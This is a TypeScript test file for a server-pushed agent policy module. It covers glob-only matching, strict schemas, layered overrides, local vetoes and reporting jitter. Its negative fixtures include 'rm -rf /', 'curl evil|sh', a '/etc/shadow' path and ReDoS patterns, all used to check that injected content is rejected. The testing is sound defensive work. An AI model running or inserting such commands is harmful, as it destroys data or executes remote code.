import { describe, expect, test } from "bun:test";
import {
  AGENT_POLICY_DEFAULT,
  AGENT_POLICY_GLOBS_MAX,
  AGENT_POLICY_INTERVAL_MAX_SECONDS,
  AGENT_POLICY_INTERVAL_MIN_SECONDS,
  AGENT_POLICY_SOFTWARE_MAX,
  AGENT_POLICY_TICK_SECONDS,
  AgentPolicyGlobSchema,
  AgentPolicyOverrideSchema,
  AgentPolicySchema,
  agentPolicyDue,
  applyAgentPolicyVeto,
  globMatches,
  matchesAnyGlob,
  policyJitterSeconds,
  resolveAgentPolicy,
  AgentPolicySoftwareSourceSchema,
  type AgentPolicyOverride,
} from "./agent-policy";
import { AgentReportAckSchema, AgentSoftwareSourceSchema } from "./infra";

describe("the policy source enum is the report contract's, restated (the cycle-avoidance guard)", () => {
  test("both option lists are identical — drift fails here, never silently in the field", () => {
    expect([...AgentPolicySoftwareSourceSchema.options]).toEqual([
      ...AgentSoftwareSourceSchema.options,
    ]);
  });
});

describe("AgentPolicyGlobSchema — globs, never server-supplied regex (#1140)", () => {
  test("accepts the shapes an operator actually writes", () => {
    for (const glob of ["veth*", "docker0", "/var/lib/docker/*", "*-dev", "linux-image-?"]) {
      expect(AgentPolicyGlobSchema.parse(glob)).toBe(glob);
    }
  });

  test("rejects every regex metacharacter — a root process must never compile server text as a regex", () => {
    for (const evil of [
      "(a+)+$",
      "^veth",
      "a{1,9999}",
      "a|b",
      "[a-z]+",
      "\\d",
      "(?:x)",
      "a.b",
    ]) {
      expect(AgentPolicyGlobSchema.safeParse(evil).success).toBe(false);
    }
  });

  test("rejects an over-long pattern rather than truncating it into a different pattern", () => {
    expect(AgentPolicyGlobSchema.safeParse("a".repeat(500)).success).toBe(false);
  });
});

describe("globMatches — the whole matcher, no regex compilation anywhere", () => {
  test("matches literally, with * and ? as the only wildcards", () => {
    expect(globMatches("veth*", "veth1a2b3c")).toBe(true);
    expect(globMatches("veth*", "eth0")).toBe(false);
    expect(globMatches("docker0", "docker0")).toBe(true);
    expect(globMatches("docker0", "docker01")).toBe(false);
    expect(globMatches("linux-image-?", "linux-image-6")).toBe(true);
    expect(globMatches("linux-image-?", "linux-image-64")).toBe(false);
    expect(globMatches("*", "anything at all")).toBe(true);
    expect(globMatches("*docker*", "/var/lib/docker/overlay2")).toBe(true);
  });

  test("is case-insensitive — NIC and package names are compared, not parsed", () => {
    expect(globMatches("VETH*", "veth0")).toBe(true);
  });

  test("stays linear on the classic catastrophic-backtracking input", () => {
    // `(a*)*b`-shaped input is the ReDoS canary. A two-pointer matcher answers instantly; a naive
    // glob→regex translation of the same pattern is where a root agent would hang.
    const started = Date.now();
    expect(globMatches("*a*a*a*a*a*a*a*b", "a".repeat(4000))).toBe(false);
    expect(Date.now() - started).toBeLessThan(500);
  });

  test("matchesAnyGlob is false for an empty list — no globs means nothing is excluded", () => {
    expect(matchesAnyGlob([], "veth0")).toBe(false);
    expect(matchesAnyGlob(["veth*", "docker*"], "docker0")).toBe(true);
  });
});

describe("AgentPolicySchema — a CLOSED set of booleans, integers and globs (#1140)", () => {
  test("the built-in default is a valid policy and is exactly today's agent behaviour", () => {
    expect(AgentPolicySchema.parse(AGENT_POLICY_DEFAULT)).toEqual(AGENT_POLICY_DEFAULT);
    expect(AGENT_POLICY_DEFAULT.intervalSeconds).toBe(900);
    expect(AGENT_POLICY_DEFAULT.collect).toEqual({
      hardware: true,
      disks: true,
      nics: true,
      software: true,
      containers: true,
    });
    expect(AGENT_POLICY_DEFAULT.exclude).toEqual({
      nicNames: [],
      mountpoints: [],
      softwareNames: [],
    });
    expect(AGENT_POLICY_DEFAULT.softwareMax).toBe(AGENT_POLICY_SOFTWARE_MAX);
  });

  test("the schema is STRICT — an unknown key is the one thing a policy must never carry", () => {
    // The report contract degrades on unknown keys on purpose. Policy is the opposite direction:
    // server → root agent. A key this build does not understand must never be silently accepted.
    const withCommand = { ...AGENT_POLICY_DEFAULT, command: "rm -rf /" };
    expect(AgentPolicySchema.safeParse(withCommand).success).toBe(false);
    const withNestedCommand = {
      ...AGENT_POLICY_DEFAULT,
      collect: { ...AGENT_POLICY_DEFAULT.collect, script: "curl evil|sh" },
    };
    expect(AgentPolicySchema.safeParse(withNestedCommand).success).toBe(false);
  });

  test("clamps the interval to the tick..24h band instead of accepting an unschedulable one", () => {
    expect(AGENT_POLICY_INTERVAL_MIN_SECONDS).toBe(AGENT_POLICY_TICK_SECONDS);
    expect(
      AgentPolicySchema.safeParse({ ...AGENT_POLICY_DEFAULT, intervalSeconds: 30 }).success,
    ).toBe(false);
    expect(
      AgentPolicySchema.safeParse({
        ...AGENT_POLICY_DEFAULT,
        intervalSeconds: AGENT_POLICY_INTERVAL_MAX_SECONDS + 1,
      }).success,
    ).toBe(false);
  });

  test("caps softwareMax at the wire contract's own array max", () => {
    expect(
      AgentPolicySchema.safeParse({
        ...AGENT_POLICY_DEFAULT,
        softwareMax: AGENT_POLICY_SOFTWARE_MAX + 1,
      }).success,
    ).toBe(false);
  });

  test("caps each exclusion list, so a policy can never become an unbounded payload", () => {
    const tooMany = Array.from({ length: AGENT_POLICY_GLOBS_MAX + 1 }, (_, i) => `veth${i}*`);
    expect(
      AgentPolicySchema.safeParse({
        ...AGENT_POLICY_DEFAULT,
        exclude: { ...AGENT_POLICY_DEFAULT.exclude, nicNames: tooMany },
      }).success,
    ).toBe(false);
  });
});

describe("AgentPolicyOverrideSchema — what a stored layer may say", () => {
  test("an empty override is valid: 'inherit everything'", () => {
    expect(AgentPolicyOverrideSchema.parse({})).toEqual({});
  });

  test("a partial group is valid — one collector can be turned off without restating the rest", () => {
    const parsed = AgentPolicyOverrideSchema.parse({ collect: { software: false } });
    expect(parsed.collect).toEqual({ software: false });
  });

  test("it carries NO revision — the server owns that counter, never a stored layer", () => {
    expect(AgentPolicyOverrideSchema.safeParse({ revision: 9 }).success).toBe(false);
  });

  test("it is closed against pushed executable content, at every depth", () => {
    expect(AgentPolicyOverrideSchema.safeParse({ script: "x" }).success).toBe(false);
    expect(
      AgentPolicyOverrideSchema.safeParse({ exclude: { paths: ["/etc/shadow"] } }).success,
    ).toBe(false);
  });
});

describe("resolveAgentPolicy — instance default < service account < node, most specific wins", () => {
  const instance: AgentPolicyOverride = {
    intervalSeconds: 1800,
    collect: { software: false },
  };
  const account: AgentPolicyOverride = { collect: { containers: false } };
  const node: AgentPolicyOverride = { intervalSeconds: 300 };

  test("no layers at all ⇒ the built-in default with the given revision", () => {
    expect(resolveAgentPolicy(7, [])).toEqual({ ...AGENT_POLICY_DEFAULT, revision: 7 });
  });

  test("layers merge per FIELD, not per group — a later layer never blanks an earlier one", () => {
    const resolved = resolveAgentPolicy(3, [instance, account, node]);
    expect(resolved.intervalSeconds).toBe(300); // node wins
    expect(resolved.collect.software).toBe(false); // instance survives
    expect(resolved.collect.containers).toBe(false); // account survives
    expect(resolved.collect.hardware).toBe(true); // built-in default survives
    expect(resolved.revision).toBe(3);
  });

  test("undefined layers are skipped, so a caller never has to branch on 'no override'", () => {
    expect(resolveAgentPolicy(1, [undefined, instance, undefined])).toEqual({
      ...AGENT_POLICY_DEFAULT,
      revision: 1,
      intervalSeconds: 1800,
      collect: { ...AGENT_POLICY_DEFAULT.collect, software: false },
    });
  });

  test("an exclusion list REPLACES rather than accumulating — an operator can shorten one", () => {
    const resolved = resolveAgentPolicy(1, [
      { exclude: { nicNames: ["veth*", "docker*"] } },
      { exclude: { nicNames: ["veth*"] } },
    ]);
    expect(resolved.exclude.nicNames).toEqual(["veth*"]);
  });
});

describe("applyAgentPolicyVeto — local config may VETO, never WIDEN (#1140, hard rule 1)", () => {
  const served = resolveAgentPolicy(4, [{ collect: { software: true }, intervalSeconds: 300 }]);

  test("a local false turns a collector off and no server policy can turn it back on", () => {
    const vetoed = applyAgentPolicyVeto(served, { collect: { software: false } });
    expect(vetoed.collect.software).toBe(false);
  });

  test("a local true can NOT re-enable what the server turned off", () => {
    const off = resolveAgentPolicy(4, [{ collect: { containers: false } }]);
    expect(applyAgentPolicyVeto(off, { collect: { containers: true } }).collect.containers).toBe(
      false,
    );
  });

  test("a local interval floor may only make reporting LESS frequent", () => {
    expect(applyAgentPolicyVeto(served, { minIntervalSeconds: 3600 }).intervalSeconds).toBe(3600);
    // A floor BELOW the served interval is not a veto — it would widen, so it is ignored.
    expect(applyAgentPolicyVeto(served, { minIntervalSeconds: 60 }).intervalSeconds).toBe(300);
  });

  test("a local software cap may only LOWER the served one", () => {
    expect(applyAgentPolicyVeto(served, { softwareMax: 10 }).softwareMax).toBe(10);
    expect(applyAgentPolicyVeto(served, { softwareMax: 99_999 }).softwareMax).toBe(
      served.softwareMax,
    );
  });

  test("local exclusions are UNIONED in — adding an exclusion only ever narrows", () => {
    const withServerGlobs = resolveAgentPolicy(4, [{ exclude: { nicNames: ["veth*"] } }]);
    const vetoed = applyAgentPolicyVeto(withServerGlobs, {
      exclude: { nicNames: ["docker*", "veth*"] },
    });
    expect([...vetoed.exclude.nicNames].sort()).toEqual(["docker*", "veth*"]);
  });

  test("no local limits at all ⇒ the served policy, untouched", () => {
    expect(applyAgentPolicyVeto(served, {})).toEqual(served);
  });

  test("the vetoed result is still a valid policy — the veto can never produce an invalid one", () => {
    const vetoed = applyAgentPolicyVeto(served, {
      minIntervalSeconds: AGENT_POLICY_INTERVAL_MAX_SECONDS * 10,
      softwareMax: -5,
    });
    expect(AgentPolicySchema.safeParse(vetoed).success).toBe(true);
  });
});

describe("agentPolicyDue — the interval inversion: a fixed tick, a server-owned cadence", () => {
  const machineId = "0123456789abcdef0123456789abcdef";
  const policy = { ...AGENT_POLICY_DEFAULT, intervalSeconds: 3600 };

  test("no state at all (first run ever, or the file was deleted) ⇒ report now", () => {
    expect(agentPolicyDue({ nowMs: 1_000_000, lastSuccessMs: undefined, policy, machineId })).toBe(
      true,
    );
  });

  test("inside the interval ⇒ a NO-OP tick, which is what makes the 5-minute timer safe", () => {
    const now = 10_000_000;
    expect(
      agentPolicyDue({ nowMs: now, lastSuccessMs: now - 60_000, policy, machineId }),
    ).toBe(false);
  });

  test("past the interval MINUS this machine's jitter ⇒ due", () => {
    const now = 10_000_000;
    const jitter = policyJitterSeconds(machineId, policy.intervalSeconds);
    expect(jitter).toBeGreaterThan(0); // this machine id genuinely has an offset
    expect(
      agentPolicyDue({
        nowMs: now,
        lastSuccessMs: now - (policy.intervalSeconds - jitter) * 1000 - 1,
        policy,
        machineId,
      }),
    ).toBe(true);
    expect(
      agentPolicyDue({
        nowMs: now,
        lastSuccessMs: now - (policy.intervalSeconds - jitter) * 1000 + 1000,
        policy,
        machineId,
      }),
    ).toBe(false);
  });

  test("jitter only ever makes a host EARLY — a tick at exactly the interval always reports", () => {
    // The upgrade-path failure this direction exists to prevent: a host that installed the new
    // binary without re-running install.sh still has the old 15-minute timer, and its interval is
    // the 15-minute default. Adding jitter would push the due instant past that tick and halve the
    // host's real reporting rate. Subtracting it cannot.
    const now = 10_000_000;
    for (const id of ["a", "bb", "ccc", "0123456789abcdef", "zz-top", machineId]) {
      expect(
        agentPolicyDue({
          nowMs: now,
          lastSuccessMs: now - policy.intervalSeconds * 1000,
          policy: { ...policy, intervalSeconds: 900 },
          machineId: id,
        }),
      ).toBe(true);
    }
  });

  test("a clock that jumped BACKWARDS reports rather than sulking until the clock catches up", () => {
    // lastSuccess in the future = an NTP correction or a restored snapshot. Waiting it out could
    // silence a host for hours and read as an outage on the map.
    expect(
      agentPolicyDue({ nowMs: 1_000, lastSuccessMs: 999_999_999, policy, machineId }),
    ).toBe(true);
  });

  test("jitter is deterministic per machine, bounded, and non-negative", () => {
    const a = policyJitterSeconds(machineId, 3600);
    expect(policyJitterSeconds(machineId, 3600)).toBe(a);
    expect(a).toBeGreaterThanOrEqual(0);
    expect(a).toBeLessThan(AGENT_POLICY_TICK_SECONDS / 2);
    expect(policyJitterSeconds("a-different-machine-id", 3600)).not.toBe(a);
  });

  test("jitter never reaches half the interval, so a cadence stays recognisably that cadence", () => {
    for (const interval of [AGENT_POLICY_TICK_SECONDS, 900, 3600, 86_400]) {
      expect(policyJitterSeconds(machineId, interval)).toBeLessThan(interval / 2);
    }
  });
});

describe("AgentReportAckSchema — the policy rides the ack, not a new endpoint (#1140)", () => {
  test("the pre-#1140 ack still parses: policy is OPTIONAL, so an older server's ack is valid", () => {
    const ack = AgentReportAckSchema.parse({
      nodeId: "clh1234567890abcdefghijkl",
      state: "PENDING",
      accepted: true,
    });
    expect(ack.policy).toBeUndefined();
  });

  test("an ack carrying a policy round-trips it verbatim", () => {
    const ack = AgentReportAckSchema.parse({
      nodeId: "clh1234567890abcdefghijkl",
      state: "CONFIRMED",
      accepted: true,
      policy: { ...AGENT_POLICY_DEFAULT, revision: 12 },
    });
    expect(ack.policy?.revision).toBe(12);
  });

  test("an ack whose policy is malformed is REJECTED, not degraded", () => {
    // The report contract degrades; this direction must not. A policy the agent cannot fully
    // validate is one it must not write to disk and act on as root.
    expect(
      AgentReportAckSchema.safeParse({
        nodeId: "clh1234567890abcdefghijkl",
        state: "CONFIRMED",
        accepted: true,
        policy: { revision: 1, intervalSeconds: 900 },
      }).success,
    ).toBe(false);
  });
});
